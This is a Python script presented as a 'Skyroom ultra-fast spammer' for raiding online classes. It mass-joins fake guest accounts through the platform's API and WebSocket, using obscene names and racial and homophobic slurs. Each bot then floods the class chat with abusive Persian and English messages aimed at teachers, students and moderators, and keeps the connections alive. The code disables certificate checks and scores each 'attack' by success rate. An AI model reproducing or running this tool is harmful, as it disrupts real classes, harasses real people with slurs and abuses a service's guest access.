import requests
import websocket
import json
import threading
import time
import random
import uuid
import ssl
from concurrent.futures import ThreadPoolExecutor

# میم‌های فارسی و انگلیسی
NAMES = [
    "۲۶", "۲۶۰", "۶۶۶", "۴۲۰", "۱۴", "۴۰", "۱۹", "۲۵", "۶۱", "۶۷", "۶۹",
    "سیکتیر", "داشاق", "علی", "پروین", "سگ", "خره", "گاو", "گاد", "نولایف",
    "کیر", "کص", "کونی", "حرومزاده", "بی‌ناموس", "بی‌غیرت", "پدرسوخته",
    "مادرجنده", "لاشی", "جنده", "فحش", "ننت", "بابات", "خواهرت", "برادرت",
    "sybau", "fuck", "bitch", "ass", "dick", "pussy", "motherfucker",
    "shit", "bastard", "whore", "slut", "nigga", "nigger", "faggot",
    "retard", "idiot", "stupid", "moron", "cunt", "cock", "piss"
]

SPAM_MESSAGES = [
    "۲۶ به ازای هر چیزی", "۲۶۰ ماشین سوار", "۶۶۶ شیطانی", "۴۲۰ حال کن",
    "سیکتیر از این کلاس", "داشاق چطوری", "علی پروین گاد", "سگ باز کن",
    "کیرم تو کلاس", "کص نگو بچه", "حرومزاده بازی درنیار",
    "ننتو میگام", "باباتو کردم", "کیرم دهنت", "کصخل بگو چیه",
    "sybau motherfucker", "fuck this class", "bitch ass teacher",
    "asshole students", "dickhead professor", "pussy moderator",
    "motherfucker admin", "shit class", "bastard system"
]

class SkyRoomRequestSpammer:
    def __init__(self):
        self.success_count = 0
        self.spam_count = 0
        self.lock = threading.Lock()
        self.active_threads = 0
        self.max_threads = 50  # افزایش thread چون سبک‌تر هست
        self.start_time = None
        self.target_users = 0
        self.attempt_count = 0
        self.session = requests.Session()
        
        # تنظیمات session
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
        })

    def extract_room_info(self, skyroom_link):
        """استخراج اطلاعات اتاق از لینک"""
        try:
            # استخراج room_id از لینک
            if "/ch/" in skyroom_link:
                parts = skyroom_link.split("/ch/")
                if len(parts) > 1:
                    room_path = parts[1].split("/")[0]
                    return room_path
            return None
        except:
            return None

    def join_class_via_api(self, name, user_id, total_users, skyroom_link):
        """ورود به کلاس از طریق API"""
        try:
            print(f"🎯 User {user_id}/{total_users}: {name}")
            
            # استخراج اطلاعات اتاق
            room_slug = self.extract_room_info(skyroom_link)
            if not room_slug:
                print(f"❌ Invalid room link: {skyroom_link}")
                return False

            # مرحله ۱: گرفتن اطلاعات اتاق
            room_info_url = f"https://www.skyroom.online/api/room/{room_slug}"
            response = self.session.get(room_info_url, timeout=10)
            
            if response.status_code != 200:
                print(f"❌ Failed to get room info: {response.status_code}")
                return False

            room_data = response.json()
            if not room_data.get('success'):
                print(f"❌ Room not found or access denied")
                return False

            room_id = room_data.get('data', {}).get('id')
            if not room_id:
                print(f"❌ Could not extract room ID")
                return False

            print(f"   📍 Room ID: {room_id}")

            # مرحله ۲: ورود به عنوان مهمان
            join_url = "https://www.skyroom.online/api/room/join"
            join_data = {
                "room_id": room_id,
                "name": name,
                "guest": True,
                "password": ""
            }

            response = self.session.post(join_url, json=join_data, timeout=10)
            
            if response.status_code != 200:
                print(f"❌ Join failed: {response.status_code}")
                return False

            join_data = response.json()
            if not join_data.get('success'):
                print(f"❌ Join rejected: {join_data.get('message', 'Unknown error')}")
                return False

            # اطلاعات اتصال
            connection_data = join_data.get('data', {})
            ws_url = connection_data.get('websocket_url')
            token = connection_data.get('token')
            
            if not ws_url or not token:
                print(f"❌ Missing connection data")
                return False

            print(f"✅ SUCCESS - User {user_id} joined: {name}")
            with self.lock:
                self.success_count += 1

            # شروع اسپم از طریق WebSocket
            self.start_websocket_spam(ws_url, token, name, user_id, total_users)
            return True

        except requests.exceptions.RequestException as e:
            print(f"❌ Network error user {user_id}: {e}")
            return False
        except Exception as e:
            print(f"❌ Error user {user_id}: {e}")
            return False
        finally:
            with self.lock:
                self.active_threads -= 1

    def start_websocket_spam(self, ws_url, token, name, user_id, total_users):
        """شروع اسپم از طریق WebSocket"""
        try:
            print(f"🔥 User {user_id} connecting to WebSocket...")
            
            # ایجاد اتصال WebSocket
            ws = websocket.create_connection(
                ws_url,
                timeout=10,
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            
            # ارسال handshake اولیه
            handshake = {
                "type": "auth",
                "token": token,
                "version": "2.0"
            }
            ws.send(json.dumps(handshake))
            
            # دریافت پاسخ handshake
            response = ws.recv()
            print(f"   ✅ WebSocket connected for user {user_id}")
            
            # شروع اسپم
            self.websocket_spam_loop(ws, name, user_id, total_users)
            
        except Exception as e:
            print(f"❌ WebSocket error user {user_id}: {e}")

    def websocket_spam_loop(self, ws, name, user_id, total_users):
        """حلقه اسپم WebSocket"""
        try:
            spam_count = 0
            max_messages = random.randint(15, 30)
            
            for i in range(max_messages):
                try:
                    message = random.choice(SPAM_MESSAGES)
                    
                    # ساخت پیام چت
                    chat_message = {
                        "type": "chat",
                        "data": {
                            "message": message,
                            "private": False,
                            "receiver_id": None
                        }
                    }
                    
                    ws.send(json.dumps(chat_message))
                    
                    with self.lock:
                        self.spam_count += 1
                        spam_count += 1
                    
                    print(f"💬 User {user_id} message {self.spam_count}: {message}")
                    
                    # فاصله تصادفی بین پیام‌ها
                    time.sleep(random.uniform(0.5, 2))
                    
                except Exception as e:
                    print(f"⚠️ Message error user {user_id}: {e}")
                    break
            
            print(f"🎊 User {user_id} spam completed: {spam_count} messages")
            
            # نگه داشتن اتصال برای مدتی
            self.keep_connection_alive(ws, user_id)
            
        except Exception as e:
            print(f"❌ Spam loop error user {user_id}: {e}")
        finally:
            try:
                ws.close()
            except:
                pass

    def keep_connection_alive(self, ws, user_id):
        """نگه داشتن اتصال فعال"""
        try:
            print(f"💚 Keeping user {user_id} connection alive...")
            
            start_time = time.time()
            max_time = random.randint(180, 600)  # 3-10 دقیقه
            
            while time.time() - start_time < max_time:
                # ارسال ping برای نگه داشتن اتصال
                try:
                    ping_msg = {"type": "ping"}
                    ws.send(json.dumps(ping_msg))
                    time.sleep(30)  # هر 30 ثانیه ping
                except:
                    break
            
            print(f"👋 User {user_id} disconnecting")
            
        except Exception as e:
            print(f"❌ Keep-alive error user {user_id}: {e}")

    def run_fast_attack(self, user_count, skyroom_link):
        """اجرای حمله سریع"""
        print("🚀 FAST REQUEST-BASED ATTACK STARTED")
        print(f"🎯 TARGET: {user_count} users")
        print(f"🔗 LINK: {skyroom_link}")
        print("⚡ METHOD: Direct API + WebSocket")
        print("=" * 60)
        
        self.start_time = time.time()
        self.target_users = user_count
        
        # شروع مانیتور
        monitor_thread = threading.Thread(target=self.fast_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # اجرای کارگران
        self.fast_workers(user_count, skyroom_link)
        
        # گزارش نهایی
        self.final_fast_report()

    def fast_workers(self, user_count, skyroom_link):
        """کارگران سریع"""
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            for i in range(user_count):
                if self.success_count >= user_count:
                    break
                    
                name = random.choice(NAMES)
                user_id = i + 1
                
                future = executor.submit(self.fast_worker, name, user_id, user_count, skyroom_link)
                futures.append(future)
                
                time.sleep(0.2)  # فاصله کم
            
            # منتظر ماندن برای اتمام
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    print(f"❌ Worker error: {e}")

    def fast_worker(self, name, user_id, total_users, skyroom_link):
        """کارگر سریع"""
        with self.lock:
            self.active_threads += 1
            self.attempt_count += 1
            
        success = self.join_class_via_api(name, user_id, total_users, skyroom_link)
        
        # تلاش مجدد در صورت شکست
        if not success and self.success_count < total_users:
            time.sleep(1)
            print(f"🔄 Retry user {user_id}")
            self.join_class_via_api(name, user_id, total_users, skyroom_link)

    def fast_monitor(self):
        """مانیتور سریع"""
        try:
            while self.success_count < self.target_users or self.active_threads > 0:
                elapsed = int(time.time() - self.start_time)
                success_rate = (self.success_count / self.target_users) * 100 if self.target_users > 0 else 0
                
                print(f"\n📊 FAST ATTACK STATUS - {elapsed}s")
                print(f"   ✅ JOINED: {self.success_count}/{self.target_users}")
                print(f"   💬 MESSAGES: {self.spam_count}")
                print(f"   🧵 ACTIVE: {self.active_threads}")
                print(f"   🔄 ATTEMPTS: {self.attempt_count}")
                print(f"   📈 SUCCESS RATE: {success_rate:.1f}%")
                
                # محاسبه سرعت
                if elapsed > 0:
                    msg_per_sec = self.spam_count / elapsed
                    join_per_sec = self.success_count / elapsed
                    print(f"   ⚡ SPEED: {msg_per_sec:.1f} msg/s, {join_per_sec:.1f} join/s")
                
                print("-" * 50)
                time.sleep(5)
                
        except Exception as e:
            print(f"❌ Monitor error: {e}")

    def final_fast_report(self):
        """گزارش نهایی"""
        total_time = int(time.time() - self.start_time)
        success_rate = (self.success_count / self.target_users) * 100
        
        print("\n" + "=" * 70)
        print("🎉 FAST ATTACK COMPLETED!")
        print("=" * 70)
        print(f"📊 FINAL RESULTS:")
        print(f"   👥 TARGET: {self.target_users} users")
        print(f"   ✅ SUCCESS: {self.success_count} users")
        print(f"   💬 MESSAGES: {self.spam_count}")
        print(f"   ⏱️ TIME: {total_time} seconds")
        print(f"   🚀 MESSAGES/SEC: {self.spam_count/total_time:.1f}" if total_time > 0 else "   🚀 MESSAGES/SEC: 0")
        print(f"   🎯 SUCCESS RATE: {success_rate:.1f}%")
        
        if success_rate >= 90:
            status = "💀 LEGENDARY"
        elif success_rate >= 70:
            status = "🔥 EXCELLENT"
        elif success_rate >= 50:
            status = "⭐ GOOD"
        elif success_rate >= 30:
            status = "⚠️ AVERAGE"
        else:
            status = "❌ POOR"
            
        print(f"   📈 STATUS: {status}")
        print("=" * 70)

def main():
    """تابع اصلی"""
    print("🎪 SKYROOM ULTRA-FAST SPAMMER")
    print("⚡ Pure Requests + WebSocket Version")
    print("=" * 50)
    
    try:
        skyroom_link = input("Enter Skyroom class link: ").strip()
        if not skyroom_link:
            print("❌ Please enter a valid link!")
            return
            
        try:
            user_count = int(input("Enter number of users: "))
            if user_count <= 0:
                print("❌ Number must be greater than 0!")
                return
        except ValueError:
            print("❌ Please enter a valid number!")
            return
        
        print(f"\n⚠️ CONFIRM FAST ATTACK:")
        print(f"   Users: {user_count}")
        print(f"   Link: {skyroom_link}")
        confirm = input("✅ Type 'y' to start: ")
        
        if confirm.lower() != 'y':
            print("❌ Cancelled!")
            return
            
        # نصب وابستگی‌های لازم
        try:
            import websocket
        except ImportError:
            print("📦 Installing required packages...")
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "websocket-client"])
            import websocket
        
        bot = SkyRoomRequestSpammer()
        
        try:
            bot.run_fast_attack(user_count, skyroom_link)
        except KeyboardInterrupt:
            print("\n🛑 Stopped by user!")
        except Exception as e:
            print(f"❌ Error: {e}")
            
        input("\nPress Enter to exit...")
        
    except Exception as e:
        print(f"❌ Fatal error: {e}")

if __name__ == "__main__":
    main()
